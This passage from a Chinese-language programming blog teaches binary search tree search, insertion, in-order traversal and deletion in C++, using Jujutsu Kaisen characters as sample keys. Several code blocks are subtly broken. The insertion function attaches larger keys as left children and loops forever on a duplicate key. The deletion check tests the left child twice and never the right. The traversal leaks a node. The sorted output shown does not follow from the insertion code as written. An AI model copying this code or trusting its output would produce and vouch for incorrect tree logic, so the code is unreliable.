class="keyword">private</span>:</span><br><span class="line">        TreeNode *leftchild, *rightchild, *parent;</span><br><span class="line">        <span class="type">int</span> key;</span><br><span class="line">        string element;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">//constructor</span></span><br><span class="line">        <span class="built_in">TreeNode</span>():<span class="built_in">leftchild</span>(<span class="number">0</span>),<span class="built_in">rightchild</span>(<span class="number">0</span>), <span class="built_in">parent</span>(<span class="number">0</span>), <span class="built_in">key</span>(<span class="number">0</span>), <span class="built_in">element</span>(<span class="string">&quot;&quot;</span>) &#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> a, string b):<span class="built_in">leftchild</span>(<span class="number">0</span>),<span class="built_in">rightchild</span>(<span class="number">0</span>),<span class="built_in">parent</span>(<span class="number">0</span>), <span class="built_in">key</span>(a), <span class="built_in">element</span>(b)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// main() will use these functions to access pointers in the private section</span></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">GetKey</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> key;&#125;</span><br><span class="line">        <span class="function">string <span class="title">GetElement</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> element;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">BST</span>; <span class="comment">// Can access pointers in the private section in TreeNode class</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BST</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        TreeNode *root;</span><br><span class="line">        <span class="function">TreeNode *<span class="title">leftmost</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function">TreeNode* <span class="title">Successor</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">BST</span>(): <span class="built_in">root</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function">TreeNode * <span class="title">search</span><span class="params">(<span class="type">int</span> key)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">insertBST</span><span class="params">(<span class="type">int</span> key, string element)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">inorderPrint</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">levelorder</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">BST</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h2><p><img src="/img/LeetCode/tree/BST_example.png"></p><blockquote><p>上面這張圖用咒術迴戰漫畫角色為例，暫時幫他們設定戰力值 (隨意設定的，勿認真XD)</p></blockquote><h3 id="搜尋成功"><a href="#搜尋成功" class="headerlink" title="搜尋成功"></a>搜尋成功</h3><p>如果我要搜尋 <code>KEY(1250)</code> 流程會像下面一樣：</p><ul><li>首先進入BST，<code>*current</code> 會指向 root，接著將 KEY(1250) 與甚爾的戰鬥力(500) 進行比較，由於 1250 &gt; 500，因此進入 right subTree</li><li>current 移動到羂索(550)，此時進行比較: 1250 &gt; 550，因此current移動到羂索的 right subTree，也就是五條(2500)</li><li>此時進行比較: 2500 &gt; 1250，因此將current 移動到五條的 left subTree，也就是乙骨(1250)</li><li>此時再進行比較: 1250 &#x3D; 1250，發現匹配結果，確認搜尋結果為乙骨，跳出while迴圈，回傳 current 值</li></ul><h3 id="搜尋失敗"><a href="#搜尋失敗" class="headerlink" title="搜尋失敗"></a>搜尋失敗</h3><p>如果我要搜尋 <code>KEY(6)</code> 流程如下:</p><ul><li>首先進入BST，<code>*current</code> 會指向 root，接著將 KEY(6) 與甚爾的戰鬥力(500) 進行比較，由於 500 &gt; 6，因此進入 left subTree</li><li>current 移動虎杖爺爺(13)，此時進行比較: 13 &gt; 6，因此current移動到虎杖爺爺的 right subTree，也就是虎杖(12)</li><li>此時進行比較: 12 &gt; 6，因此需要將current 移動到虎杖的 left subTree，但虎杖的 left subTree 為 NULL</li><li>current為 NULL 則跳出迴圈，並回傳NULL，代表搜尋失敗</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode *<span class="title">BST::search</span><span class="params">(<span class="type">int</span> KEY)</span></span>&#123;</span><br><span class="line">    TreeNode *current = root;</span><br><span class="line">    <span class="keyword">while</span>(current!= <span class="literal">NULL</span> &amp;&amp; KEY != current-&gt;key)&#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;key &gt; KEY)&#123;</span><br><span class="line">            current = current-&gt;leftchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            current = current-&gt;rightchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Insertion"><a href="#Insertion" class="headerlink" title="Insertion"></a>Insertion</h2><p><img src="/img/LeetCode/tree/BST_insert_example.png"></p><p>接續著 Search，如果想要插入資料的話，<strong>必須要先找到適當的插入位置，再將節點連接到樹上。</strong></p><p>要找到適當的插入位置，需要兩個指標，一個負責找位置，一個指向新插入節點的Parent。</p><p>首先找位置的指標就叫 <code>*current</code>，而指向parent 的指標就先叫 <code>*parentInsert</code>，這兩個指標每次都會同步移動。</p><ul><li>首先 <code>*current</code> 進入 root 節點，此時的 <code>*parentInsert</code> 為 root 的 parent，即為NULL</li><li>此時我們要插入的角色為里香，戰鬥值為 520，所以 KEY(520) 與 <code>*current</code> 的 Key(500) 相比， 520 &gt; 500，因此里香應該會是在甚爾的 right subTree</li><li>因此將 <code>*current</code> 往甚爾的 right child 移動 (羂索)，並且 <code>*parentInsert</code> 更新為甚爾(500)</li><li>此時將里香的 Key(520) 與 羂索(550)做比較，520 &lt; 550，因此里香應該要再羂索的 left subTree</li><li>因此 <code>*current</code> 往羂索的 left child (NULL) 移動，並且 <code>*parentInsert</code> 更新為羂索(550)</li><li>由於此時的 <code>*current</code> 為 NULL，因此跳出迴圈，因為找到了適當的插入位置，即為當前 <code>*parentInsert</code> 的 child</li></ul><p>這時候僅需要判斷要插入在當前parent 的 left 還是 right child 位置，所以比較里香(520) 與 parent 羂索(550)，要插入的位置為羂索的 left child位置，因此這時候將節點新增在該位置上，如圖所示。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BST::insertBST</span><span class="params">(<span class="type">int</span> key, string element)</span></span>&#123;</span><br><span class="line">    TreeNode *current = root;</span><br><span class="line">    TreeNode *parentInsert = <span class="literal">NULL</span>;</span><br><span class="line">    TreeNode *insertNode = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(key, element);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//Find the appropriate insert position</span></span><br><span class="line">    <span class="keyword">while</span>(current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        parentInsert = current;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt; key &gt; insertNode-&gt;key)&#123;</span><br><span class="line">            current = current-&gt;leftchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(current-&gt; key &lt; insertNode-&gt;key)&#123;</span><br><span class="line">            current = current-&gt;rightchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    insertNode-&gt;parent = parentInsert;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(parentInsert == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;root = insertNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(insertNode-&gt;key &gt; parentInsert-&gt;key)&#123;</span><br><span class="line">        parentInsert-&gt;leftchild = insertNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (insertNode-&gt;key &lt; parentInsert-&gt;key)&#123;</span><br><span class="line">        parentInsert-&gt;rightchild = insertNode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用 <code>insertBST</code> 來去建立一顆 BST Tree</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    BST T;</span><br><span class="line"></span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">500</span>,<span class="string">&quot;甚爾&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">550</span>,<span class="string">&quot;羂索&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">2500</span>,<span class="string">&quot;五條&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">48</span>,<span class="string">&quot;七海&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">1250</span>,<span class="string">&quot;乙骨&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">13</span>,<span class="string">&quot;虎杖爺爺&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">3000</span>,<span class="string">&quot;宿儺&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">70</span>,<span class="string">&quot;東堂&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">520</span>,<span class="string">&quot;里香&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">50</span>,<span class="string">&quot;帳相&quot;</span>);</span><br><span class="line">    T.<span class="built_in">insertBST</span>(<span class="number">12</span>,<span class="string">&quot;虎杖&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Test insertion method</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Inorder Traversal:\n&quot;</span>;</span><br><span class="line">    T.<span class="built_in">inorderPrint</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Test search method</span></span><br><span class="line">    TreeNode *node = T.<span class="built_in">search</span>(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">if</span>(node != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;There is &quot;</span> &lt;&lt; node-&gt;<span class="built_in">GetElement</span>() &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; node-&gt;<span class="built_in">GetKey</span>() &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;no element with Key(1000)&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    node = T.<span class="built_in">search</span>(<span class="number">73</span>);</span><br><span class="line">    <span class="keyword">if</span>(node != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;There is &quot;</span> &lt;&lt; node-&gt;<span class="built_in">GetElement</span>() &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; node-&gt;<span class="built_in">GetKey</span>() &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;no element with Key(73)&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的 <code>inorderPrint()</code> 可以透過本篇前半部分提到的 <code>leftmost()</code> 以及 <code>Successor</code> 來實現。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode *<span class="title">BST::leftmost</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(current-&gt;leftchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        current = current-&gt;leftchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode *<span class="title">BST::Successor</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;rightchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">leftmost</span>(current-&gt;rightchild);</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode *SuccessorNode = current-&gt;parent;</span><br><span class="line">    <span class="comment">// if current node is succesor&#x27;s right child, then keep moving back to it&#x27;s parent node.</span></span><br><span class="line">    <span class="keyword">while</span>( SuccessorNode != <span class="literal">NULL</span> &amp;&amp; current == SuccessorNode-&gt;rightchild)&#123;</span><br><span class="line">        current = SuccessorNode;</span><br><span class="line">        SuccessorNode = SuccessorNode-&gt;parent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Suceessor == NULL or the current node is Successor&#x27;s left child</span></span><br><span class="line">    <span class="keyword">return</span> SuccessorNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BST::inorderPrint</span><span class="params">()</span></span>&#123;</span><br><span class="line">    TreeNode *current = <span class="keyword">new</span> TreeNode;</span><br><span class="line">    current = <span class="built_in">leftmost</span>(root);</span><br><span class="line">    <span class="keyword">while</span>(current)&#123;</span><br><span class="line">        cout &lt;&lt; current-&gt;element &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; current-&gt;key &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        current = <span class="built_in">Successor</span>(current);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我們執行程式後的輸出結果如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Inorder Traversal:</span><br><span class="line">虎杖(12) 虎杖爺爺(13) 七海(48) 帳相(50) 東堂(70) 甚爾(500) 里香(520) 羂索(550) 乙骨(1250) 五條(2500) 宿儺(3000) </span><br><span class="line">no element with Key(1000)</span><br><span class="line">no element with Key(73)</span><br></pre></td></tr></table></figure><p>這樣看起來輸出結果是正確的</p><h2 id="Sort"><a href="#Sort" class="headerlink" title="Sort"></a>Sort</h2><p>可以觀察一下前面的圖，其實上面的樹也可以看成對一棵樹進行 Inorder Traversal 後的結果。因為BST的定義  <code>L subTree &lt;= n &lt; R subTree</code> 與 Inorder <code>(L&lt;V&lt;R)</code> 順序相同。 </p><p>因此執行 <code>inorderPrint()</code> 就是以 inorder 順序對 BST 中節點依序進行 visiting</p><h2 id="Deletion"><a href="#Deletion" class="headerlink" title="Deletion"></a>Deletion</h2><p>由於刪除節點，與該節點連接的所有節點 ( <code>leftchild</code>, <code>rightchild</code>, <code>parent</code> )都會受到影響，以下歸類三種處理情境:</p><ul><li><strong>情境一: 要刪除的節點是 leaf，沒有 child pointer</strong></li><li><strong>情境二: 要刪除的節點只有一個 child (不管是 leftchild 或是 rightchild)</strong></li><li><strong>情境三: 要刪除的節點有兩個 child</strong></li></ul><h3 id="情境一"><a href="#情境一" class="headerlink" title="情境一"></a>情境一</h3><p>解決方法很簡單，就直接把 Leaf node 刪除，原本 parent 的 child pointer 指向 NULL</p><p><img src="/img/LeetCode/tree/BST_delete_1.png"></p><h3 id="情境二"><a href="#情境二" class="headerlink" title="情境二"></a>情境二</h3><p>情境二，要刪除的node有一個child，這時必須將其child的 <code>*parent</code> 指向要刪除node的 <code>*parent</code>，而parent node 的 child pointer 要指向該node的child，之後再進行刪除節點的動作</p><p>舉例來說，如果我們要把 五條(2500) 刪掉，我們就必須</p><ol><li>先把 乙骨(1250) 的 <code>*parent</code> 指向五條的 parent node 羂索(550)</li><li>把 羂索(550) 的 <code>rightchild</code> 指向 乙骨(1250)，由於乙骨本來就再羂索的 rigtht subTree，因此這麼做一樣可以維持BST</li><li>刪除 五條(2500) 這個節點</li></ol><p><img src="/img/LeetCode/tree/BST_delete_2.png"></p><h3 id="情境三"><a href="#情境三" class="headerlink" title="情境三"></a>情境三</h3><p>情境三，要刪除的node有兩個 child，影響到的node較多，但有個好方法:</p><div class="note info flat"><p><strong>與其直接刪除節點，不如釋放其 Successor 或 Predecessor 的記憶體位置，之後再拿原本 Successor 或 Predecessor 的值將待刪除節點的資料替換掉。</strong></p></div><p>舉例來說，我想要刪除帳相(50)，可以把他的 Successor 東堂(70) (或 Predecessor 七海(48)) 的記憶體位置釋放，再將Successor的資料值 東堂(70) (或 Predecessor 七海(48)) 放回帳相(50) 的記憶體位址。</p><p><img src="/img/LeetCode/tree/BST_delete_3.png"></p><p>如何實現，可以透過一個BST的特性來簡化問題，即 <strong>「具有兩個child的node，其 Successor 或 Predecessor 一定是 Leaf Node 或只有一個child 的 node」</strong>。這裡可以為這個特性舉例子驗證看看:</p><p>虎杖爺爺(13) 的 Successor是七海(48), Predecessor 是虎杖(12)<br>甚爾(500) 的 Successor是羂索(550), Predecessor 是虎杖爺爺(13)</p><blockquote><p>Successor: 找 right subTree 中的最小值<br>Predecessor: 找 left subTree 中最大值</p></blockquote><p><strong>所以這樣問題就會簡化成情境一與情境二</strong></p><h3 id="實作"><a href="#實作" class="headerlink" title="實作"></a>實作</h3><p>這裡可以在先前的 BST class 中定義一個新的成員函數</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeleteBST</span><span class="params">(<span class="type">int</span> key)</span></span>;</span><br></pre></td></tr></table></figure><p>實作DeleteBST 流程如下:</p><ol><li>先透過 <code>Search()</code>確認想要刪除的node是否存在BST中</li><li>把真正會被釋放記憶體的pointer調整成「至多只有一個child」的node</li><li>把真正會被釋放記憶體的node的child指向新的parent</li><li>把真正會被釋放記憶體的node的parent指向新的child</li><li>若真正會被釋放記憶體是「替身」，再把替身的資料放回BST中</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BST::DeleteBST</span><span class="params">(<span class="type">int</span> KEY)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    TreeNode *deleteNode = <span class="built_in">search</span>(KEY);</span><br><span class="line">    <span class="keyword">if</span>(deleteNode == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error: no such node in the tree&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TreeNode *actualDeleteNode = <span class="number">0</span>;</span><br><span class="line">    TreeNode *childOfDeleteNode = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(deleteNode-&gt;leftchild == <span class="literal">NULL</span> || deleteNode-&gt;leftchild == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">// 如果是情境一或二，那要被刪除的node就是搜尋找到的node</span></span><br><span class="line">        actualDeleteNode = deleteNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="comment">// 如果是情境三，要被刪除的就會是該node的Successor 或 Predecessor</span></span><br><span class="line">        actualDeleteNode = <span class="built_in">Successor</span>(deleteNode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接著將 childOfDeleteNode 指向要被釋放記憶體節點的left child 或 right child節點</span></span><br><span class="line">    <span class="keyword">if</span>(actualDeleteNode-&gt;leftchild!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        childOfDeleteNode = actualDeleteNode-&gt;leftchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        childOfDeleteNode = actualDeleteNode-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果要刪除的節點不是leaf，則需要將chuld的parent指回待刪除node的parent</span></span><br><span class="line">    <span class="keyword">if</span>(childOfDeleteNode!=<span class="literal">NULL</span>)&#123; </span><br><span class="line">        childOfDeleteNode-&gt;parent = actualDeleteNode-&gt;parent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接著要分別處理 Parent 指向 child node 的部分</span></span><br><span class="line">    <span class="keyword">if</span>(actualDeleteNode-&gt;parent==<span class="literal">NULL</span>)&#123; <span class="comment">// 要考慮如果 root 就是要被刪掉的node，那他就不會有parent</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;root = childOfDeleteNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(actualDeleteNode == actualDeleteNode-&gt;parent-&gt;leftchild)&#123;</span><br><span class="line">         actualDeleteNode-&gt;parent-&gt;leftchild = childOfDeleteNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        actualDeleteNode-&gt;parent-&gt;rightchild = childOfDeleteNode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Case3, the actualDeleteNode might be assigned to successor or predecessor</span></span><br><span class="line">    <span class="keyword">if</span>(deleteNode!= actualDeleteNode)&#123;</span><br><span class="line">        deleteNode-&gt;key = actualDeleteNode-&gt;key;</span><br><span class="line">        deleteNode-&gt;element = actualDeleteNode-&gt;element;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> actualDeleteNode;</span><br><span class="line">    actualDeleteNode = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接著在 <code>main()</code> 加入 <code>T.DeleteBST(50);</code> (刪除帳相)，輸出結果如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Inorder Traversal:</span><br><span class="line">虎杖(12) 虎杖爺爺(13) 七海(48) 帳相(50) 東堂(70) 甚爾(500) 里香(520) 羂索(550) 乙骨(1250) 五條(2500) 宿儺(3000) </span><br><span class="line">After deletion:</span><br><span class="line">虎杖(12) 虎杖爺爺(13) 七海(48) 東堂(70) 甚爾(500) 里香(520) 羂索(550) 乙骨(1250) 五條(2500) 宿儺(3000)</span><br></pre></td></tr></table></figure><p>刪掉甚爾(500) root:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Inorder Traversal:</span><br><span class="line">虎杖(12) 虎杖爺爺(13) 七海(48) 帳相(50) 東堂(70) 甚爾(500) 里香(520) 羂索(550) 乙骨(1250) 五條(2500) 宿儺(3000) </span><br><span class="line">After deletion:</span><br><span class="line">虎杖(12) 虎杖爺爺(13) 七海(48) 帳相(50) 東堂(70) 里香(520) 羂索(550) 乙骨(1250) 五條(2500) 宿儺(3000)</span><br></pre></td></tr></table></figure><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這次學習手刻一個 Binary Tree 以及實現BST Tree 的許多相關操作，也參考了許多資料，逐步完成。而一定會有更好或更加簡易的寫法，希望之後能夠結合 STL 的使用，實際在刷leetcode的過程中用出來。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://alrightchiu.github.io/SecondRound/binary-tree-traversalxun-fang.html?source=post_page-----a02fedbc51a8--------------------------------#in">https://alrightchiu.github.io/SecondRound/binary-tree-traversalxun-fang.html?source=post_page-----a02fedbc51a8--------------------------------#in</a></p><p>[2] <a href="https://alrightchiu.github.io/SecondRound/binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao.html#binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao">https://alrightchiu.github.io/SecondRound/binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao.html#binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao</a></p><p>[3] <a href="https://pjchender.dev/dsa/dsa-bst/">https://pjchender.dev/dsa/dsa-bst/</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Tree Traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題必會知識 | 樹 (Tree) | 基礎篇 | LeetCode 筆記</title>
      <link href="/posts/tree_for_leetcode.html"/>
      <url>/posts/tree_for_leetcode.html</url>
      
